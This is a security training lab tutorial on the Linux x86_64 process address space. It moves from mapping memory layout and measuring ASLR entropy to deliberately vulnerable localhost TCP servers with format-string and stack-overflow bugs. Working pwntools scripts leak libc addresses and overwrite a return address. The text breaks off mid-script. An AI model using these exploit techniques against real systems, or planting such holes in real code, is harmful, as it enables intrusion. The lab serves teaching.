# Tutorial: Process Address Space & Memory Management — Hands-On Lab

> **Domain 2, Chapter 2A — Lab Companion**
>
> **Scope.** Linux process address space layout on x86_64. Kernel data structures (`task_struct`, `mm_struct`, `vm_area_struct`). mmap/brk internals. Stack placement, ASLR entropy, vDSO/vvar. Memory mapping flags. `mprotect`/`mremap`/`madvise` security implications. Page fault handling. Page table management (PGD → PUD → PMD → PTE). Huge pages. ASLR bypass techniques (format string, brute-force, partial overwrite, side channels). Stack Clash (CVE-2017-1000364). Dirty COW (CVE-2016-5195). Dirty Pipe (CVE-2022-0847). Heap shaping. MAP_FIXED abuse. Page table manipulation (ret2dir, PTE overwrite). Memory forensics. Detection engineering.
>
> **Prerequisites.** Domain 1 tutorials (ELF foundations + advanced). A Linux x86_64 system (VM recommended). Root access for kernel-level exercises. Familiarity with C, Python, basic assembly.

---

## Lab Environment Setup

### Hardware / VM Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU | x86_64, 2 cores | x86_64, 4+ cores with VT-x |
| RAM | 4 GB | 8+ GB |
| Disk | 40 GB | 80 GB (for memory dumps) |
| OS | Ubuntu 22.04 / Debian 12 | Ubuntu 22.04 LTS (kernel 5.15–6.x) |

You need **two VMs** for some exercises:

- **VM-ATTACK**: Primary lab VM — Ubuntu 22.04 with development tools and intentionally relaxed kernel settings.
- **VM-FORENSICS**: Clean analysis VM — for Volatility3 analysis of memory dumps.

### Tool Installation (VM-ATTACK)

```bash
#!/bin/bash
# setup_lab_vm_attack.sh — install all required tools for Domain 2A lab

set -euo pipefail

echo "[*] Installing build essentials and kernel headers..."
sudo apt-get update
sudo apt-get install -y \
    build-essential gcc g++ gdb \
    linux-headers-$(uname -r) \
    linux-tools-$(uname -r) \
    linux-tools-common \
    nasm \
    cmake \
    git \
    curl \
    wget \
    python3 python3-pip python3-venv \
    bpftrace bpfcc-tools libbpf-dev \
    auditd audispd-plugins \
    strace ltrace \
    binutils \
    xxd \
    jq \
    tmux \
    net-tools \
    patchelf

echo "[*] Installing Python security tools..."
python3 -m pip install --user --break-system-packages \
    pwntools \
    capstone \
    keystone-engine \
    unicorn \
    ropper \
    volatility3

echo "[*] Installing checksec..."
if ! command -v checksec &>/dev/null; then
    wget -q https://raw.githubusercontent.com/slimm609/checksec.sh/main/checksec \
        -O /usr/local/bin/checksec
    chmod +x /usr/local/bin/checksec
fi

echo "[*] Installing ROPgadget..."
python3 -m pip install --user --break-system-packages ROPgadget

echo "[*] Cloning LiME for memory acquisition..."
if [ ! -d "$HOME/tools/LiME" ]; then
    mkdir -p "$HOME/tools"
    git clone https://github.com/504ensicsLabs/LiME.git "$HOME/tools/LiME"
fi

echo "[*] Creating lab directory structure..."
mkdir -p "$HOME/lab_domain2a"/{exploits,defense,forensics,scripts,dumps,configs}

echo "[*] Setting up compiler flags helper..."
cat > "$HOME/lab_domain2a/scripts/compile.sh" << 'SCRIPT'
#!/bin/bash
# Compile with or without mitigations
# Usage: ./compile.sh <source.c> [vuln|hardened]

SRC="$1"
MODE="${2:-vuln}"
OUT="${SRC%.c}"

if [ "$MODE" = "vuln" ]; then
    gcc -o "$OUT" "$SRC" \
        -fno-stack-protector \
        -fno-stack-clash-protection \
        -no-pie \
        -z execstack \
        -z norelro \
        -Wno-format-security \
        -D_FORTIFY_SOURCE=0 \
        -g
    echo "[vuln] Compiled $SRC -> $OUT (no protections)"
elif [ "$MODE" = "hardened" ]; then
    gcc -o "$OUT" "$SRC" \
        -fstack-protector-strong \
        -fstack-clash-protection \
        -pie -fPIE \
        -Wl,-z,relro,-z,now \
        -Wformat -Wformat-security \
        -D_FORTIFY_SOURCE=3 \
        -g
    echo "[hardened] Compiled $SRC -> $OUT (full protections)"
else
    echo "Usage: $0 <source.c> [vuln|hardened]"
fi
SCRIPT
chmod +x "$HOME/lab_domain2a/scripts/compile.sh"

echo "[*] Setup complete. Lab directory: $HOME/lab_domain2a"
```

### Tool Installation (VM-FORENSICS)

```bash
#!/bin/bash
# setup_lab_vm_forensics.sh — forensics analysis station

set -euo pipefail

sudo apt-get update
sudo apt-get install -y \
    python3 python3-pip python3-venv \
    golang-go \
    git \
    yara \
    binutils \
    xxd

echo "[*] Installing Volatility3..."
python3 -m pip install --user --break-system-packages volatility3

echo "[*] Installing dwarf2json for Volatility3 symbol generation..."
if [ ! -d "$HOME/tools/dwarf2json" ]; then
    mkdir -p "$HOME/tools"
    git clone https://github.com/volatilityfoundation/dwarf2json.git \
        "$HOME/tools/dwarf2json"
    cd "$HOME/tools/dwarf2json" && go build && cd -
fi

echo "[*] Forensics station ready."
```

### Kernel Configuration for Lab Exercises

Some exercises require relaxed kernel settings. **Apply these only on the lab VM, never on production.**

```bash
#!/bin/bash
# lab_kernel_settings.sh — configure kernel for lab exercises
# WARNING: Weakens security. Lab VM only.

set -euo pipefail

echo "[*] Saving original sysctl values..."
BACKUP_DIR="$HOME/lab_domain2a/configs"
mkdir -p "$BACKUP_DIR"

for param in kernel.randomize_va_space vm.mmap_rnd_bits \
             kernel.yama.ptrace_scope kernel.kptr_restrict \
             kernel.dmesg_restrict kernel.perf_event_paranoid \
             vm.unprivileged_userfaultfd; do
    val=$(sysctl -n "$param" 2>/dev/null || echo "N/A")
    echo "$param = $val" >> "$BACKUP_DIR/sysctl_backup.txt"
done

echo "[*] Applying lab-permissive settings..."
# ASLR: keep enabled (2) for ASLR exercises — disable per-exercise
sudo sysctl -w kernel.randomize_va_space=2

# Allow ptrace (needed for several exercises)
sudo sysctl -w kernel.yama.ptrace_scope=0

# Expose kernel pointers (needed for page table exercises)
sudo sysctl -w kernel.kptr_restrict=0

# Allow dmesg access
sudo sysctl -w kernel.dmesg_restrict=0

# Allow unprivileged perf
sudo sysctl -w kernel.perf_event_paranoid=1

# Allow unprivileged userfaultfd (if available)
sudo sysctl -w vm.unprivileged_userfaultfd=1 2>/dev/null || true

echo "[*] Lab kernel settings applied."
echo "[*] To restore: sudo sysctl -p $BACKUP_DIR/sysctl_backup.txt"
```

### Restoring Production Settings

```bash
#!/bin/bash
# restore_kernel_settings.sh — restore hardened kernel configuration
sudo sysctl -w kernel.randomize_va_space=2
sudo sysctl -w vm.mmap_rnd_bits=32
sudo sysctl -w kernel.yama.ptrace_scope=2
sudo sysctl -w kernel.kptr_restrict=2
sudo sysctl -w kernel.dmesg_restrict=1
sudo sysctl -w kernel.perf_event_paranoid=3
sudo sysctl -w vm.unprivileged_userfaultfd=0 2>/dev/null || true
echo "[*] Production hardening restored."
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Process Memory Layout Exploration and Mapping

**Objective:** Understand and visualize the x86_64 process address space layout. Map every region — text, data, BSS, heap (brk), mmap region, thread stacks, vDSO/vvar, and main stack. Identify ASLR effects.

#### Step 1: Build a comprehensive memory map reporter

```c
/* mem_layout_explorer.c — report complete process address space layout
 * Compile: gcc -o mem_layout mem_layout_explorer.c -lpthread -pie -fPIE
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/auxv.h>
#include <dlfcn.h>
#include <stdint.h>

/* Global variables land in .data/.bss */
int global_initialized = 42;                /* .data */
int global_uninitialized;                   /* .bss */
const char global_const[] = "read-only";    /* .rodata */

/* Function in .text */
void marker_function(void) {
    asm volatile("nop");
}

void *thread_func(void *arg) {
    int thread_stack_var = 0xDEAD;
    printf("  [Thread %ld]\n", (long)arg);
    printf("    Thread stack var:    %p\n", (void *)&thread_stack_var);

    /* Thread stack is mmap'd, not in main stack region */
    char line[512];
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
        while (fgets(line, sizeof(line), maps)) {
            if (strstr(line, "[stack]") == NULL) {
                /* Find the mapping containing our stack var */
                unsigned long start, end;
                if (sscanf(line, "%lx-%lx", &start, &end) == 2) {
                    if ((unsigned long)&thread_stack_var >= start &&
                        (unsigned long)&thread_stack_var < end) {
                        printf("    Thread stack VMA:    %s", line);
                    }
                }
            }
        }
        fclose(maps);
    }

    /* Hold thread alive for observation */
    sleep(2);
    return NULL;
}

int main(int argc, char **argv, char **envp) {
    int stack_var = 0xBEEF;
    static int static_var = 99;   /* .data (function-scope static) */
    void *heap_brk = sbrk(0);
    void *heap_mmap = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                           MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    void *heap_malloc = malloc(256);

    printf("=== x86_64 Process Address Space Layout ===\n");
    printf("PID: %d\n\n", getpid());

    printf("--- Code Segments ---\n");
    printf("  main() address:        %p   (.text)\n", (void *)main);
    printf("  marker_function():     %p   (.text)\n", (void *)marker_function);

    printf("\n--- Data Segments ---\n");
    printf("  global_const:          %p   (.rodata)\n", (void *)global_const);
    printf("  global_initialized:    %p   (.data)\n", (void *)&global_initialized);
    printf("  static_var:            %p   (.data)\n", (void *)&static_var);
    printf("  global_uninitialized:  %p   (.bss)\n", (void *)&global_uninitialized);

    printf("\n--- Heap ---\n");
    printf("  brk (program break):   %p   (brk heap top)\n", heap_brk);
    printf("  malloc(256):           %p   (brk or mmap depending on size)\n",
           heap_malloc);
    printf("  mmap anon:             %p   (mmap region)\n", heap_mmap);

    printf("\n--- Stack ---\n");
    printf("  main stack var:        %p\n", (void *)&stack_var);
    printf("  argv:                  %p\n", (void *)argv);
    printf("  envp:                  %p\n", (void *)envp);
    printf("  argv[0]:               %p -> \"%s\"\n",
           (void *)argv[0], argv[0]);

    printf("\n--- Special Regions ---\n");
    unsigned long vdso = getauxval(AT_SYSINFO_EHDR);
    printf("  vDSO (AT_SYSINFO_EHDR): 0x%lx\n", vdso);

    void *libc_printf = dlsym(NULL, "printf");
    printf("  libc printf():         %p\n", libc_printf);

    printf("\n--- Dynamic Linker ---\n");
    void *ld_sym = dlsym(NULL, "_dl_find_dso_for_object");
    printf("  ld.so symbol:          %p\n", ld_sym);

    printf("\n--- Thread Stacks ---\n");
    pthread_t threads[3];
    for (long i = 0; i < 3; i++) {
        pthread_create(&threads[i], NULL, thread_func, (void *)i);
    }
    for (int i = 0; i < 3; i++) {
        pthread_join(threads[i], NULL);
    }

    printf("\n--- Address Space Regions (sorted) ---\n");
    printf("  .text        : ~%p\n", (void *)main);
    printf("  .rodata      : ~%p\n", (void *)global_const);
    printf("  .data        : ~%p\n", (void *)&global_initialized);
    printf("  .bss         : ~%p\n", (void *)&global_uninitialized);
    printf("  brk heap     : ~%p\n", heap_brk);
    printf("  mmap region  : ~%p\n", heap_mmap);
    printf("  vDSO         :  0x%lx\n", vdso);
    printf("  stack        : ~%p\n", (void *)&stack_var);

    printf("\n--- Full /proc/self/maps ---\n");
    FILE *maps = fopen("/proc/self/maps", "r");
    if (maps) {
        char line[512];
        while (fgets(line, sizeof(line), maps)) {
            printf("  %s", line);
        }
        fclose(maps);
    }

    free(heap_malloc);
    munmap(heap_mmap, 4096);

    return 0;
}
```

#### Step 2: Observe ASLR randomization

```bash
cd ~/lab_domain2a/exploits

# Compile as PIE
gcc -o mem_layout mem_layout_explorer.c -lpthread -pie -fPIE -g

# Run 3 times — observe address changes
for i in 1 2 3; do
    echo "=== Run $i ==="
    ./mem_layout 2>/dev/null | grep -E '(main\(\)|brk|mmap|stack|vDSO)'
    echo
done

# Expected output: Each run shows different base addresses for .text,
# heap, mmap, stack, and vDSO due to ASLR.
```

**Expected output (addresses differ each run):**
```
=== Run 1 ===
  main() address:        0x55f8a3401169   (.text)
  brk (program break):   0x55f8a4a12000   (brk heap top)
  mmap anon:             0x7f2c34100000   (mmap region)
  main stack var:        0x7ffd8e234abc
  vDSO (AT_SYSINFO_EHDR): 0x7ffd8e3fe000

=== Run 2 ===
  main() address:        0x556234c01169   (.text)
  brk (program break):   0x5562357f2000   (brk heap top)
  mmap anon:             0x7f9b12300000   (mmap region)
  main stack var:        0x7ffc45678def
  vDSO (AT_SYSINFO_EHDR): 0x7ffc457c2000
```

#### Step 3: Measure ASLR entropy

```python
#!/usr/bin/env python3
"""aslr_entropy.py — measure actual ASLR randomization bits.
Runs a binary N times, collects region base addresses,
and computes the observed entropy.
"""
import subprocess
import re
import math
from collections import Counter

N_RUNS = 500
binary = "./mem_layout"

regions = {
    "text":  [],
    "stack": [],
    "mmap":  [],
    "brk":   [],
    "vdso":  [],
}

for i in range(N_RUNS):
    try:
        output = subprocess.check_output(
            [binary], stderr=subprocess.DEVNULL, timeout=5
        ).decode()
    except (subprocess.TimeoutExpired, subprocess.CalledProcessError):
        continue

    for line in output.split("\n"):
        if "main() address:" in line:
            m = re.search(r"0x([0-9a-f]+)", line)
            if m:
                addr = int(m.group(1), 16)
                regions["text"].append(addr >> 12)  # page-aligned
        elif "brk (program break):" in line:
            m = re.search(r"0x([0-9a-f]+)", line)
            if m:
                addr = int(m.group(1), 16)
                regions["brk"].append(addr >> 12)
        elif "mmap anon:" in line:
            m = re.search(r"0x([0-9a-f]+)", line)
            if m:
                addr = int(m.group(1), 16)
                regions["mmap"].append(addr >> 12)
        elif "main stack var:" in line:
            m = re.search(r"0x([0-9a-f]+)", line)
            if m:
                addr = int(m.group(1), 16)
                regions["stack"].append(addr >> 12)
        elif "AT_SYSINFO_EHDR" in line:
            m = re.search(r"0x([0-9a-f]+)", line)
            if m:
                addr = int(m.group(1), 16)
                regions["vdso"].append(addr >> 12)

print(f"{'Region':<10} {'Samples':<10} {'Unique':<10} {'Entropy (bits)':<15}")
print("-" * 50)

for region, pages in regions.items():
    if not pages:
        continue
    unique = len(set(pages))
    # Shannon entropy
    counts = Counter(pages)
    total = len(pages)
    entropy = -sum(
        (c / total) * math.log2(c / total)
        for c in counts.values()
    )
    page_range = max(pages) - min(pages) if len(pages) > 1 else 0
    range_bits = math.log2(page_range) if page_range > 0 else 0
    print(f"{region:<10} {total:<10} {unique:<10} {entropy:<15.2f}")
    print(f"  Range: {page_range} pages = {page_range * 4096 / (1024**2):.1f} MB "
          f"(~{range_bits:.1f} bits)")
```

```bash
python3 aslr_entropy.py
# Observe: mmap gets ~28 bits, stack ~22 bits, brk ~13 bits
# These match the kernel defaults documented in the source chapter §5
```

#### Step 4: Visualize the address space

```python
#!/usr/bin/env python3
"""addr_space_visualizer.py — ASCII visualization of /proc/PID/maps.
Usage: python3 addr_space_visualizer.py <pid|self>
"""
import sys
import re

def parse_maps(pid):
    path = f"/proc/{pid}/maps"
    vmas = []
    with open(path) as f:
        for line in f:
            m = re.match(
                r'([0-9a-f]+)-([0-9a-f]+)\s+([rwxps-]+)\s+'
                r'([0-9a-f]+)\s+\S+\s+\d+\s*(.*)',
                line.strip()
            )
            if m:
                vmas.append({
                    "start": int(m.group(1), 16),
                    "end":   int(m.group(2), 16),
                    "perms": m.group(3),
                    "offset": m.group(4),
                    "name":  m.group(5).strip(),
                })
    return vmas

def classify(vma):
    name = vma["name"]
    perms = vma["perms"]
    if name == "[stack]":
        return "STACK", "\033[91m"    # red
    if name == "[heap]":
        return "HEAP", "\033[93m"     # yellow
    if name == "[vdso]":
        return "VDSO", "\033[96m"     # cyan
    if name == "[vvar]":
        return "VVAR", "\033[96m"
    if name == "[vsyscall]":
        return "VSYS", "\033[95m"     # magenta
    if name and "/" in name:
        if "x" in perms:
            return "LIB_X", "\033[92m"  # green
        if "w" in perms:
            return "LIB_W", "\033[33m"  # dark yellow
        return "LIB_R", "\033[90m"      # gray
    if not name:
        if "x" in perms:
            return "ANON_X", "\033[91;1m"  # bright red (suspicious!)
        if "w" in perms:
            return "ANON_W", "\033[37m"
        return "ANON_R", "\033[90m"
    return "OTHER", "\033[0m"

RESET = "\033[0m"

def main():
    pid = sys.argv[1] if len(sys.argv) > 1 else "self"
    vmas = parse_maps(pid)

    if not vmas:
        print("No VMAs found.", file=sys.stderr)
        sys.exit(1)

    total_span = vmas[-1]["end"] - vmas[0]["start"]
    bar_width = 80

    print(f"Address Space Map for PID {pid}")
    print(f"Span: {vmas[0]['start']:#018x} — {vmas[-1]['end']:#018x}")
    print(f"Total: {total_span / (1024**3):.2f} GiB virtual\n")
    print(f"{'Start':<18} {'End':<18} {'Size':>10} {'Perms':<6} "
          f"{'Type':<8} {'Name'}")
    print("-" * 100)

    wx_count = 0
    anon_exec_count = 0

    for vma in vmas:
        size = vma["end"] - vma["start"]
        label, color = classify(vma)

        if "w" in vma["perms"] and "x" in vma["perms"]:
            wx_count += 1
        if label == "ANON_X":
            anon_exec_count += 1

        if size >= 1024 * 1024:
            size_str = f"{size / (1024*1024):.1f} MB"
        elif size >= 1024:
            size_str = f"{size / 1024:.0f} KB"
        else:
            size_str = f"{size} B"

        name_display = vma["name"][:40] if vma["name"] else "(anonymous)"
        print(f"{color}{vma['start']:#018x} {vma['end']:#018x} "
              f"{size_str:>10} {vma['perms']:<6} {label:<8} "
              f"{name_display}{RESET}")

    print("\n--- Summary ---")
    print(f"Total VMAs: {len(vmas)}")
    print(f"W+X regions: {wx_count}", end="")
    if wx_count:
        print(" ⚠ SECURITY CONCERN", end="")
    print()
    print(f"Anonymous executable: {anon_exec_count}", end="")
    if anon_exec_count:
        print(" ⚠ POTENTIAL INJECTION", end="")
    print()

if __name__ == "__main__":
    main()
```

```bash
# Visualize own process
python3 addr_space_visualizer.py self

# Visualize another process
python3 addr_space_visualizer.py $(pidof sshd)
```

**Verification:**
- [ ] Address space output shows distinct regions for .text (r-xp), .data (rw-p), heap, mmap, stack
- [ ] Three runs of `mem_layout` show different addresses each time
- [ ] Entropy measurement shows ~28 bits for mmap, ~22 for stack, ~13 for brk
- [ ] Visualizer correctly identifies and color-codes all region types

---

### Exercise 2: ASLR Bypass via Format String Information Leak

**Objective:** Build a vulnerable program with a format string bug. Exploit it to leak stack pointers, libc addresses, and defeat ASLR. Then compute libc base and locate `system()`.

#### Step 1: Build the vulnerable server

```c
/* fmt_vuln_server.c — TCP server with format string vulnerability.
 * Forks per connection (fork-no-exec model).
 * Compile: gcc -o fmt_server fmt_vuln_server.c -no-pie -z norelro
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/wait.h>

#define PORT 4444
#define BUF_SIZE 512

void handle_client(int client_fd) {
    char buf[BUF_SIZE];
    char response[2048];
    ssize_t n;

    write(client_fd, "Enter your name: ", 17);
    n = read(client_fd, buf, BUF_SIZE - 1);
    if (n <= 0) return;
    buf[n] = '\0';
    /* Strip newline */
    char *nl = strchr(buf, '\n');
    if (nl) *nl = '\0';

    /* VULNERABILITY: user input used as format string */
    int len = snprintf(response, sizeof(response), buf);
    write(client_fd, response, len);
    write(client_fd, "\n", 1);
}

int main(void) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 10);
    printf("[*] Format string server on port %d (PID=%d)\n", PORT, getpid());

    while (1) {
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd < 0) continue;

        pid_t pid = fork();
        if (pid == 0) {
            close(server_fd);
            handle_client(client_fd);
            close(client_fd);
            _exit(0);
        }
        close(client_fd);
        waitpid(-1, NULL, WNOHANG);
    }
}
```

```bash
cd ~/lab_domain2a/exploits

# Compile without protections
gcc -o fmt_server fmt_vuln_server.c -no-pie -z norelro -g

# Start the server in background
./fmt_server &
FMT_PID=$!
echo "[*] Server PID: $FMT_PID"
```

#### Step 2: Manual format string probing

```bash
# Probe for stack leaks — each %p reads one 8-byte value from the stack
echo '%p.%p.%p.%p.%p.%p.%p.%p' | nc localhost 4444
# Expected: 8 hex values from the stack. Some will be recognizable:
# - 0x7fXXXXXXXXXX values are likely libc/stack pointers
# - 0x55XXXXXXXXXX values are likely PIE binary pointers (if PIE)
# - 0x400XXX values are non-PIE binary pointers

# Direct parameter access — probe specific positions
for i in $(seq 1 20); do
    result=$(echo "%${i}\$p" | nc -q 1 localhost 4444 2>/dev/null | head -1)
    echo "Position $i: $result"
done
```

#### Step 3: Automated ASLR bypass exploit

```python
#!/usr/bin/env python3
"""fmt_string_aslr_bypass.py — leak libc base via format string.

This script:
1. Connects to the vulnerable server
2. Uses %p to leak stack values
3. Identifies libc return addresses
4. Computes libc base
5. Locates system(), /bin/sh, and useful gadgets
"""
from pwn import *
import re

context.arch = "amd64"
context.log_level = "info"

TARGET = "127.0.0.1"
PORT = 4444

# Step 1: Determine which stack positions contain libc pointers.
# Libc pointers on x86_64 start with 0x7f.
def probe_stack(max_pos=30):
    """Probe stack positions for pointer values."""
    leaks = {}
    for i in range(1, max_pos + 1):
        try:
            io = remote(TARGET, PORT, timeout=3)
            io.recvuntil(b"name: ")
            io.sendline(f"%{i}$p".encode())
            resp = io.recvline().strip().decode()
            io.close()

            if resp.startswith("0x") and resp != "(nil)":
                val = int(resp, 16)
                leaks[i] = val
                # Classify the pointer
                if 0x7f0000000000 <= val <= 0x7fffffffffff:
                    region = "libc/ld/stack/mmap"
                elif 0x550000000000 <= val <= 0x55ffffffffffff:
                    region = "PIE binary"
                elif 0x400000 <= val <= 0x4fffff:
                    region = "non-PIE binary"
                else:
                    region = "unknown"
                log.info(f"Position {i:2d}: {val:#018x}  [{region}]")
        except Exception:
            pass
    return leaks

log.info("Phase 1: Probing stack for libc pointers...")
leaks = probe_stack()

# Step 2: Identify libc return addresses.
# __libc_start_main+XXX or __libc_start_call_main+XXX is typically
# the return address from main(), appearing early on the stack.
libc_candidates = {
    pos: val for pos, val in leaks.items()
    if 0x7f0000000000 <= val <= 0x7fffffffffff
}

if not libc_candidates:
    log.failure("No libc pointers found. Is the server running?")
    exit(1)

# Step 3: Try to determine libc base.
# The offset depends on the libc version. Common offsets for
# __libc_start_main return address:
# Ubuntu 22.04 glibc 2.35: __libc_start_call_main + 128 = 0x29d90
# Ubuntu 20.04 glibc 2.31: __libc_start_main + 243 = 0x270b3

KNOWN_OFFSETS = {
    "__libc_start_call_main+128": 0x29d90,
    "__libc_start_main+243": 0x270b3,
    "__libc_start_main+234": 0x270aa,
    "__libc_start_call_main+122": 0x29d8a,
}

log.info(f"\nFound {len(libc_candidates)} libc-range pointers:")
for pos, val in sorted(libc_candidates.items()):
    log.info(f"  Position {pos}: {val:#018x}")
    # Try each known offset
    for name, offset in KNOWN_OFFSETS.items():
        candidate_base = val - offset
        # Libc base must be page-aligned
        if candidate_base & 0xfff == 0:
            log.success(f"  Possible libc base: {candidate_base:#018x} "
                        f"(assuming {name})")
            # Verify: system() should be at a reasonable offset
            system_addr = candidate_base + 0x50d70  # typical offset
            log.info(f"  system() would be at: {system_addr:#018x}")

log.info("\nPhase 2: To complete exploitation, determine your libc version:")
log.info("  1. readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system")
log.info("  2. readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | "
         "grep __libc_start")
log.info("  3. strings -tx /usr/lib/x86_64-linux-gnu/libc.so.6 | "
         "grep '/bin/sh'")

# Step 4: Automate libc base calculation with local libc
try:
    libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
    start_main_sym = libc.symbols.get("__libc_start_main", None)
    start_call_sym = libc.symbols.get("__libc_start_call_main", None)
    system_off = libc.symbols.get("system", None)
    binsh_off = next(libc.search(b"/bin/sh"), None)

    if start_call_sym is not None:
        log.info(f"\nLocal libc analysis:")
        log.info(f"  __libc_start_call_main: {start_call_sym:#x}")
        log.info(f"  system:                 {system_off:#x}")
        if binsh_off:
            log.info(f"  /bin/sh string:         {binsh_off:#x}")

        # Try to match leaked values
        for pos, val in sorted(libc_candidates.items()):
            for delta in range(0, 512, 2):
                candidate = val - start_call_sym - delta
                if candidate & 0xfff == 0 and candidate > 0:
                    log.success(
                        f"\n  LIBC BASE = {candidate:#018x} "
                        f"(from position {pos}, offset +{delta})")
                    log.success(
                        f"  system()  = {candidate + system_off:#018x}")
                    if binsh_off:
                        log.success(
                            f"  /bin/sh   = {candidate + binsh_off:#018x}")
                    break
except FileNotFoundError:
    log.warning("Local libc not found at standard path — skip auto-analysis")

# Cleanup
log.info("\nDone. Kill the server with: kill $FMT_PID")
```

```bash
python3 fmt_string_aslr_bypass.py
```

**Expected output:**
```
[*] Phase 1: Probing stack for libc pointers...
[*] Position  1: 0x00007f4a12345678  [libc/ld/stack/mmap]
[*] Position  7: 0x00007f4a11e270b3  [libc/ld/stack/mmap]
...
[+] LIBC BASE = 0x00007f4a11e00000 (from position 7, offset +0)
[+] system()  = 0x00007f4a11e50d70
[+] /bin/sh   = 0x00007f4a11fd2882
```

**Verification:**
- [ ] Format string `%p` leaks stack values through the server
- [ ] Libc pointers (0x7f... range) are identified among leaks
- [ ] Libc base is correctly computed (page-aligned, system() at valid offset)
- [ ] Multiple runs show different libc base but consistent offsets

---

### Exercise 3: ASLR Brute-Force Against Fork-No-Exec Server

**Objective:** Build a vulnerable fork-no-exec TCP server with a stack buffer overflow. Demonstrate that ASLR can be brute-forced because all children share the parent's address layout.

#### Step 1: Build the vulnerable server

```c
/* fork_no_exec_server.c — fork-based TCP server with stack overflow.
 * All children share parent ASLR layout.
 * Compile: gcc -o fork_server fork_no_exec_server.c -fno-stack-protector -no-pie
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <signal.h>

#define PORT 5555
#define VULN_BUF_SIZE 64

void win_function(void) {
    /* This function simulates a sensitive action.
       In a real exploit, you'd redirect to system() or a ROP chain. */
    FILE *f = fopen("/tmp/pwned.txt", "w");
    if (f) {
        fprintf(f, "Exploit successful! PID=%d\n", getpid());
        fclose(f);
    }
    write(STDOUT_FILENO, "WIN\n", 4);
}

void handle_client(int fd) {
    char buf[VULN_BUF_SIZE];
    char response[] = "OK\n";

    /* VULNERABILITY: reads more than buffer size */
    ssize_t n = read(fd, buf, 256);
    if (n <= 0) return;

    write(fd, response, sizeof(response) - 1);
}

int main(void) {
    int server_fd, client_fd;
    struct sockaddr_in addr;
    int opt = 1;

    signal(SIGCHLD, SIG_IGN);

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);

    bind(server_fd, (struct sockaddr *)&addr, sizeof(addr));
    listen(server_fd, 100);

    printf("[*] Fork-no-exec server on port %d\n", PORT);
    printf("[*] win_function at: %p\n", (void *)win_function);
    printf("[*] All children share this ASLR layout\n");

    while (1) {
        client_fd = accept(server_fd, NULL, NULL);
        if (client_fd < 0) continue;

        pid_t pid = fork();
        if (pid == 0) {
            close(server_fd);
            handle_client(client_fd);
            close(client_fd);
            _exit(0);
        }
        close(client_fd);
    }
}
```

#### Step 2: Demonstrate shared ASLR layout across forks

```c
/* aslr_fork_demo.c — prove fork preserves ASLR layout */
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/wait.h>
#include <dlfcn.h>

int main(void) {
    void *libc_addr = dlsym(NULL, "printf");

    printf("[Parent PID=%d] printf @ %p\n", getpid(), libc_addr);

    for (int i = 0; i < 5; i++) {
        pid_t pid = fork();
        if (pid == 0) {
            void *child_libc = dlsym(NULL, "printf");
            printf("[Child  PID=%d] printf @ %p %s\n",
                   getpid(), child_libc,
                   child_libc == libc_addr ? "(SAME)" : "(DIFFERENT!)");
            _exit(0);
        }
        waitpid(pid, NULL, 0);
    }
    return 0;
}
```

```bash
gcc -o aslr_fork_demo aslr_fork_demo.c -ldl -pie -fPIE
./aslr_fork_demo
# All children show identical printf address — ASLR is per-execve, not per-fork
```

**Expected output:**
```
[Parent PID=1234] printf @ 0x7f4a12345670
[Child  PID=1235] printf @ 0x7f4a12345670 (SAME)
[Child  PID=1236] printf @ 0x7f4a12345670 (SAME)
[Child  PID=1237] printf @ 0x7f4a12345670 (SAME)
[Child  PID=1238] printf @ 0x7f4a12345670 (SAME)
[Child  PID=1239] printf @ 0x7f4a12345670 (SAME)
```

#### Step 3: Brute-force the non-PIE server

```python
#!/usr/bin/env python3
"""brute_force_fork.py — brute-force a non-PIE fork-no-exec server.

Since the server is compiled -no-pie, win_function has a fixed address
(no ASLR on the executable). This exercise demonstrates the fork model
weakness: even with ASLR on libc, the binary addresses are fixed.
For PIE binaries, the brute-force would target the mmap region.
"""
from pwn import *
import struct

context.arch = "amd64"
context.log_level = "warning"

TARGET = "127.0.0.1"
PORT = 5555

# Step 1: Get win_function address from the server output
# (In a real scenario, you'd compute this from the leaked binary)
# For non-PIE: known from compilation
WIN_ADDR = None  # Will be extracted

# First, read the server's printed address
print("[*] In a real scenario, you'd find win_function via info leak.")
print("[*] For this lab, check the server output for the address.")

# Ask user for the address (or parse from server)
import sys
if len(sys.argv) > 1:
    WIN_ADDR = int(sys.argv[1], 16)
else:
    print("Usage: python3 brute_force_fork.py <win_function_hex_addr>")
    print("Example: python3 brute_force_fork.py 0x401196")
    sys.exit(1)

OFFSET = 64 + 8  # buf[64] + saved rbp

log.setLevel("info")
log.info(f"Target: {TARGET}:{PORT}")
log.info(f"win_function: {WIN_ADDR:#x}")
log.info(f"Overflow offset: {OFFSET}")

payload = b"A" * OFFSET + p64(WIN_ADDR)

attempts = 0
successes = 0
MAX_ATTEMPTS = 20

for i in range(MAX_ATTEMPTS):
    attempts += 1
    try:
        io = remote(TARGET, PORT, timeout=2)
        io.send(payload)
        resp = io.recv(timeout=1)
        io.close()

